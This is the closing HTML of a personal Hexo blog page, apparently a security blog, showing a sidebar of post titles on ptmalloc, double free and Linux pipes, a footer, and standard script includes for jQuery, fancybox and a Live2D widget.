            <a href="/2020/10/24/ptmalloc/">ptmalloc机制闲扯</a>
          </li>
        
          <li>
            <a href="/2020/10/23/Double-free/">Double free</a>
          </li>
        
          <li>
            <a href="/2020/09/05/linux-fd/">linux中的pipe与fd</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 ph4ntom<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>